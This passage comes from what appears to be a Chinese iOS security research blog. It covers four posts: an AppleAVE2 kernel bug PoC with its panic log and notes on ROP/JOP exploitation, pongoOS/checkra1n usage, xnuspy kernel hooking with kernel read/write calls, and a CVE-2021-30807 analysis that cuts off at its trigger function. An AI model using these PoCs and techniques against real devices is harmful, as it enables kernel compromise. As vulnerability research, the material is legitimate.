InitInfoSurfaceId, vulnerable IOSurface mapping </span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x0c</span>) = surface_id; <span class="comment">// ParameterSetsBuffer</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0xd0</span>) = surface_id; <span class="comment">// codedHeaderCSID &amp; codedHeaderBuffer [0]</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0xd4</span>) = surface_id; <span class="comment">// codedHeaderCSID &amp; codedHeaderBuffer [1]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_SetSessionSettings </span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">7</span>, </span><br><span class="line">                                        setSessionSettings_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(setSessionSettings_inputStruct), </span><br><span class="line">                                        setSessionSettings_outputStruct, </span><br><span class="line">                                        &amp;setSessionSettings_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;SetSessionSettings: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Trigger the bug </span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> close_inputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> close_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t close_outputStruct_size = <span class="keyword">sizeof</span>(close_outputStruct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_my_close </span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">1</span>, </span><br><span class="line">                                        close_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(close_inputStruct), </span><br><span class="line">                                        close_outputStruct, </span><br><span class="line">                                        &amp;close_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;my_close: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>log：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">panic(cpu <span class="number">5</span> caller <span class="number">0xfffffff007205df4</span>): Kernel data abort. (saved state: <span class="number">0xffffffe03cafaf40</span>)</span><br><span class="line">      x0: <span class="number">0x4141414142424242</span>  x1:  <span class="number">0xffffffe02cb09c28</span>  x2:  <span class="number">0x0000000000000000</span>  x3:  <span class="number">0xffffffe02cb09c28</span></span><br><span class="line">      x4: <span class="number">0x0000000000000000</span>  x5:  <span class="number">0x0000000000000000</span>  x6:  <span class="number">0xfffffff00f35bb54</span>  x7:  <span class="number">0x0000000000000000</span></span><br><span class="line">      x8: <span class="number">0x0000000000000006</span>  x9:  <span class="number">0x0000000000000006</span>  x10: <span class="number">0x0000000000000001</span>  x11: <span class="number">0x0000000000080022</span></span><br><span class="line">      x12: <span class="number">0x0000000000000022</span> x13: <span class="number">0xffffffe00094bc08</span>  x14: <span class="number">0x0000000000080023</span>  x15: <span class="number">0x0000000000006903</span></span><br><span class="line">      x16: <span class="number">0xfffffff00ee71740</span> x17: <span class="number">0x0000000000000000</span>  x18: <span class="number">0xfffffff00ee79000</span>  x19: <span class="number">0x4141414142424242</span></span><br><span class="line">      x20: <span class="number">0xffffffe02cb08000</span> x21: <span class="number">0x0000000000000000</span>  x22: <span class="number">0xffffffe02cb09c28</span>  x23: <span class="number">0x0000000000000005</span></span><br><span class="line">      x24: <span class="number">0xffffffe02cb2f748</span> x25: <span class="number">0xffffffe02cb0d034</span>  x26: <span class="number">0x0000000000000050</span>  x27: <span class="number">0xffffffe004929218</span></span><br><span class="line">      x28: <span class="number">0x0000000000000000</span> fp:  <span class="number">0xffffffe03cafb2a0</span>  lr:  <span class="number">0xfffffff0069397e8</span>  sp:  <span class="number">0xffffffe03cafb290</span></span><br><span class="line">      pc:  <span class="number">0xfffffff0069398dc</span> cpsr: <span class="number">0x80400304</span>         esr: <span class="number">0x96000004</span>          far: <span class="number">0x414141414242429a</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>pc</code>对齐是在<code>x0-&gt;0x58</code>指令之前的分支:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xFFFFFFF0069398CC</span> IOSurfaceBufferMngr::CompleteFence</span><br><span class="line"><span class="number">0xFFFFFFF0069398CC</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398CC</span>                 STP             X20, X19, [SP,#<span class="number">-0x10</span>+var_10]!</span><br><span class="line"><span class="number">0xFFFFFFF0069398D0</span>                 STP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line"><span class="number">0xFFFFFFF0069398D4</span>                 ADD             X29, SP, #<span class="number">0x10</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398D8</span>                 MOV             X19, X0</span><br><span class="line"><span class="number">0xFFFFFFF0069398DC</span>                 LDR             X0, [X0,#<span class="number">0x58</span>]                 <span class="comment">// Faults here </span></span><br><span class="line"><span class="number">0xFFFFFFF0069398E0</span>                 CBZ             X0, loc_FFFFFFF006939908</span><br><span class="line"><span class="number">0xFFFFFFF0069398E4</span>                 LDRB            W8, [X19,#<span class="number">0x1E</span>]</span><br><span class="line"><span class="number">0xFFFFFFF0069398E8</span>                 CBNZ            W8, loc_FFFFFFF006939908</span><br><span class="line"><span class="number">0xFFFFFFF0069398EC</span>                 MOV             W1, #<span class="number">0</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398F0</span>                 BL              IOFence__complete</span><br><span class="line"><span class="number">0xFFFFFFF0069398F4</span>                 LDR             X0, [X19,#<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0xFFFFFFF0069398F8</span>                 LDR             X8, [X0]</span><br><span class="line"><span class="number">0xFFFFFFF0069398FC</span>                 LDR             X8, [X8,#<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0xFFFFFFF006939900</span>                 BLR             X8</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>一旦逃逸了沙盒，利用这个漏洞就非常简单。</p>
<p>PoC中的代码也可用于EXP，但是<code>SetSessionSettings</code>缓冲区(<code>0x4141414142424242</code>)中提供的值必须指向可控的内核缓冲区，可以从该缓冲区加载函数指针。另外一个堆信息泄漏的漏洞可以用于稳定性保证。在kASLR失败的情况下，还可以根据每个设备推测堆的位置:在堆内存高地址测试下，大量的分配很可能会在相同的内存范围(<code>0xffffffffe1xxxxxxxx</code>)。</p>
<p>因为这个漏洞可以让我们控制PC，所以它可以通过ROP或JOP进行利用。虽然不一定适用于有PAC的A12或更新版本的设备，但非A12&#x2F;A13是支持我们沙盒逃逸，还要注意，在构建ROP&#x2F;JOP链时，可控内核缓冲区的地址在x19内，另一个可控指针在x0内，可以用作stack pivot或暂存内存空间。</p>
<p>反弹shell <a target="_blank" rel="noopener" href="https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%204066/poc">POC</a>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195619">https://www.anquanke.com/post/id/195619</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/12/pongoOS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/12/pongoOS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">pongoOS学习记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-12-12 10:26:14 / Modified: 16:51:43" itemprop="dateCreated datePublished" datetime="2021-12-12T10:26:14+08:00">2021-12-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>pongoOS是一个为Apple打造的预启动执行环境，一个简易操作系统。</p>
<blockquote>
<p>⚠️</p>
<p>由于checkra1n是利用checkm8漏洞来实现pongoOS的，所以只支持A7-A11。</p>
</blockquote>
<p>checkra1n利用checkm8漏洞将pongoOS注入到iBoot中，pongoOS通过内存Hook劫持iBoot，在iBoot末尾启动自身，pongoOS执行后加载KPF(Kernel Patch Finder)内核模块。</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>源码链接：<a target="_blank" rel="noopener" href="https://github.com/checkra1n/pongoOS">https://github.com/checkra1n/pongoOS</a></p>
<p>Mac上只需要<code>make all</code>即可。</p>
<p>主要生成以下4个产物：</p>
<ul>
<li>Pongo，PongoOS的Mach-O文件</li>
<li>Pongo.bin，与上面相同，但作为可以跳转到的裸机二进制文件</li>
<li>checkra1n-kpf-pongo， checkra1n 内核补丁查找器，作为 Pongo 模块 (Mach-O&#x2F;kext)</li>
<li>PongoConsolidated.bin， PongoOS 和 KPF 合并成一个二进制文件</li>
</ul>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>USB连接设备</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkra1n -k Pongo.bin                  <span class="comment"># Boots to Pongo shell, KPF not available</span></span><br><span class="line">checkra1n -k PongoConsolidated.bin      <span class="comment"># Auto-runs KPF and boots to XNU</span></span><br><span class="line">checkra1n -k PongoConsolidated.bin -p   <span class="comment"># Loads KPF, but boots to Pongo shell</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/11/iOS%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0Hook%E6%A1%86%E6%9E%B6-xnuspy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/11/iOS%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0Hook%E6%A1%86%E6%9E%B6-xnuspy/" class="post-title-link" itemprop="url">iOS内核函数Hook框架 - xnuspy</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-11 23:46:10" itemprop="dateCreated datePublished" datetime="2021-12-11T23:46:10+08:00">2021-12-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-12-13 20:01:37" itemprop="dateModified" datetime="2021-12-13T20:01:37+08:00">2021-12-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>xnuspy 是一个 pongoOS 模块，它安装了一个新的系统调用<code>xnuspy_ctl</code>，允许从用户空间Hook内核函数。</p>
<p><strong>适用范围：在 checkra1n 0.12.2 及更高版本上支持 iOS 13.x、iOS 14.x 和 iOS 15.x，不支持TV 4K 设备。</strong></p>
<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>brew install libusb</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>make即可</p>
<p>一些编译可能有用的选项：</p>
<ul>
<li><pre><code class="bash">XNUSPY_DEBUG=1 #将 xnuspy 的调试输出发送到内核日志(kprintf)
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  XNUSPY_SERIAL=1 #将调试输出从 xnuspy 发送到IOLog</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><pre><code class="bash">XNUSPY_LEAKED_PAGE_LIMIT=n #设置 xnuspy 在其垃圾收集线程开始释放它们之前允许泄漏的页数。默认为64。更多信息可以在[Debugging Kernel Panics下找到
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  XNUSPY_TRAMP_PAGES=n #设置 xnuspy 为其蹦床结构保留的页数。默认值为 1。更多信息可以在limits下找到</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p><code>XNUSPY_DEBUG</code>并且<code>XNUSPY_SERIAL</code>不相互依赖。</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>使用checkra1n将设备引导至 pongo shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/checkra1n.app/Contents/MacOS/checkra1n -p</span><br></pre></td></tr></table></figure>

<p>在xnuspy目录下执行 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loader/loader module/xnuspy</span><br></pre></td></tr></table></figure>

<p>几秒钟后你的设备就会启动。</p>
<h1 id="xnuspy-ctl"><a href="#xnuspy-ctl" class="headerlink" title="xnuspy_ctl"></a>xnuspy_ctl</h1><p>xnuspy 将修补一个 enosys 系统调用，以指向 xnuspy_ctl_tramp。这是一个小的跳板，它将编译后的 xnuspy_ctl 代码标记为可执行代码，并将分支指向它。你可以在module&#x2F;el1&#x2F;xnuspy_ctl&#x2F;xnuspy_ctl.c中找到xnuspy_ctl的实现，在example目录中找到例子。</p>
<p>include&#x2F;xnuspy&#x2F;里面是xnuspy_ctl.h，这个头文件定义了xnuspy_ctl的常量。它被包含在所有Hook内核函数的程序中。</p>
<p>你可以使用 sysctlbyname 来了解哪个系统调用被修补了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> oldlen = <span class="built_in">sizeof</span>(<span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> SYS_xnuspy_ctl = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sysctlbyname</span>(<span class="string">&quot;kern.xnuspy_ctl_callnum&quot;</span>, &amp;SYS_xnuspy_ctl, &amp;oldlen, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这个系统调用需要四个参数，flavor、arg1、arg2和arg3，arg1、arg2和arg3的含义取决于flavor。flavor可以是</p>
<ul>
<li><p>XNUSPY_CHECK_IF_PATCHED</p>
<p>检查 xnuspy_ctl 是否存在，返回999，其他参数的值被忽略。</p>
</li>
<li><p>XNUSPY_INSTALL_HOOK</p>
<p>匹配MSHookFunction的API。 arg1是想钩住的内核函数的UNSLID地址。arg2是一个指向ABI兼容的替换函数的指针。 arg3是一个指针，用于xnuspy_ctl复制出代表原始内核函数的蹦床的地址。如果不打算调用原始函数，这个指针可以是NULL。</p>
</li>
<li><p>XNUSPY_REGISTER_DEATH_CALLBACK</p>
<p>注册一个可选的 “死亡回调”，当钩子程序退出时，xnuspy会调用这个函数，清理在内核钩子上创建的任何东西。如果创建了内核线程，可以在这个函数中终止它们。</p>
<p>回调不是异步调用的，所以如果主线程阻塞，就会阻止xnuspy的垃圾回收线程执行。</p>
<p>arg1是一个指向回调函数的指针。其他参数的值被忽略。</p>
</li>
<li><p>XNUSPY_CALL_HOOKME</p>
<p>hookme是一个小的汇编存根，xnuspy通过xnuspy缓存导出以提供Hook。用这种方式调用 xnuspy_ctl 会导致 hookme 被调用，提供了一种方法来轻松获得内核代码的执行，而不用去钩住一个实际的内核函数。</p>
<p>arg1是一个参数，当它被调用时将被传递给hookme。这个参数可以是NULL。</p>
</li>
<li><p>XNUSPY_CACHE_READ</p>
<p>从 xnuspy 缓存中读取的方法。它包含了许多有用的东西，如kprintf、current_proc、kernel_thread_start、一些libc函数和内核滑动。关于缓存ID的完整列表，请查看example&#x2F;xnuspy_ctl.h。</p>
<p>arg1是xnuspy_ctl.h中定义的缓存ID之一，arg2是一个指针，用于xnuspy_ctl复制出请求的地址或值。其他参数的值被忽略。</p>
</li>
<li><p>XNUSPY_KREAD</p>
<p>在没有tfp0的情况下从用户空间读取内核内存。</p>
<p>arg1是一个内核虚拟地址，arg2是用户空间缓冲区的地址，arg3是该用户空间缓冲区的大小。</p>
</li>
<li><p>XNUSPY_KWRITE</p>
<p>从用户空间写到内核内存，而不用tfp0。</p>
<p>arg1是一个内核虚拟地址，arg2是一个用户空间缓冲区的地址，arg3是该用户空间缓冲区的大小。</p>
</li>
<li><p>XNUSPY_GET_CURRENT_THREAD</p>
<p>为用户空间提供了调用线程的内核地址。</p>
<p>arg1是一个指针，用于xnuspy_ctl复制出current_thread的返回值。其他参数的值被忽略。</p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/06/iOS-LPE-CVE-2021-30807/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/06/iOS-LPE-CVE-2021-30807/" class="post-title-link" itemprop="url">iOS LPE-CVE-2021-30807</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-06 22:12:44" itemprop="dateCreated datePublished" datetime="2021-12-06T22:12:44+08:00">2021-12-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-12-11 23:39:49" itemprop="dateModified" datetime="2021-12-11T23:39:49+08:00">2021-12-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞是从应用程序沙箱中逆向IOServices时发现的，这是一个存在于<code>AppleCLCD/IOMobileFrameBuffer</code>中的漏洞。</p>
<blockquote>
<p>原文链接: <a target="_blank" rel="noopener" href="https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html">https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html</a></p>
</blockquote>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>该漏洞位于<code>AppleCLCD/IOMFB</code>的外部方法 83 ，即<code>IOMobileFramebufferUserClient::s_displayed_fb_surface()</code>函数中。下面是从iOS 14 beta中逆向得到的结果:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferUserClient::s_displayed_fb_surface</span><span class="params">(IOUserClient **a1, __int64 a2, IOExternalMethodArguments_s *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [xsp+10h] [xbp-30h]</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// [xsp+1Bh] [xbp-25h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+1Ch] [xbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [xsp+20h] [xbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v_retval; <span class="comment">// [xsp+24h] [xbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v_retval = <span class="number">0xE00002C1</span>;</span><br><span class="line">  v7 = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = IOUserClient::<span class="built_in">copyClientEntitlement</span>(a1[<span class="number">29</span>], <span class="string">&quot;com.apple.private.allow-explicit-graphics-priority&quot;</span>, args);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v4 == gOSBooleanTrue;</span><br><span class="line">    (*(*v4 + <span class="number">40LL</span>))(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v_retval = IOMobileFramebufferUserClient::<span class="built_in">get_displayed_surface</span>(a1, &amp;v6, *args-&gt;scalarInput);</span><br><span class="line">    *args-&gt;scalarOutput = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v_retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>IOMobileFramebufferUserClient::get_displayed_surface()</code>函数:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferUserClient::get_displayed_surface</span><span class="params">(IOMobileFramebufferUserClient *<span class="keyword">this</span>, <span class="type">unsigned</span> <span class="type">int</span> *a2, <span class="type">unsigned</span> <span class="type">int</span> scalar0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (*(**(<span class="keyword">this</span> + <span class="number">27</span>) + <span class="number">0x798LL</span>))(*(<span class="keyword">this</span> + <span class="number">27</span>), *(<span class="keyword">this</span> + <span class="number">29</span>), a2, scalar0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>+0x798 处的函数是<code>IOMobileFramebufferLegacy::get_displayed_surface()</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferLegacy::get_displayed_surface</span><span class="params">(IOMobileFramebufferLegacy *<span class="keyword">this</span>, task *a2, <span class="type">unsigned</span> <span class="type">int</span> *a3, <span class="type">unsigned</span> <span class="type">int</span> scalar0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v_retval; <span class="comment">// [xsp+10h] [xbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v_retval = <span class="number">0xE00002BC</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">this</span> + scalar0 + <span class="number">331</span>) &amp;&amp; *(<span class="keyword">this</span> + <span class="number">366</span>) )</span><br><span class="line">    v_retval = IOSurfaceRoot::<span class="built_in">copyPortNameForSurfaceInTask</span>(*(<span class="keyword">this</span> + <span class="number">366</span>), a2, *(<span class="keyword">this</span> + scalar0 + <span class="number">331</span>), a3);</span><br><span class="line">  <span class="keyword">return</span> v_retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的汇编代码可以看出，调用<code>IOSurfaceRoot::copyPortNameForSurfaceInTask()</code>函数时，没有对数组的下标运算进行安全检查，以判断是否造成越界，故造成内核类型混淆(这一点需要结合IOSurface的机制来看):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FFFFFFF00970ADDC LDR             X8, [SP,#0x30+v_this]</span><br><span class="line">FFFFFFF00970ADE0 LDR             X0, [X8,#0xB70] ; this</span><br><span class="line">FFFFFFF00970ADE4 LDUR            X1, [X29,#var_10] ; task *</span><br><span class="line">FFFFFFF00970ADE8 ADD             X9, X8, #0xA58</span><br><span class="line">FFFFFFF00970ADEC LDR             W10, [SP,#0x30+v_scalar0]</span><br><span class="line">FFFFFFF00970ADF0 MOV             X11, X10</span><br><span class="line">FFFFFFF00970ADF4 ADD             X9, X9, X11,LSL#3</span><br><span class="line">FFFFFFF00970ADF8 LDR             X2, [X9] ; IOSurface *</span><br><span class="line">FFFFFFF00970ADFC LDR             X3, [SP,#0x30+var_18] ; unsigned int *</span><br><span class="line">FFFFFFF00970AE00 BL              IOSurfaceRoot::copyPortNameForSurfaceInTask(task *,IOSurface *,uint *)</span><br></pre></td></tr></table></figure>

<p>至于触发就很简单了，下面是POC:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trigger_clcd_vuln</span><span class="params">(<span class="type">void</span>)</span> 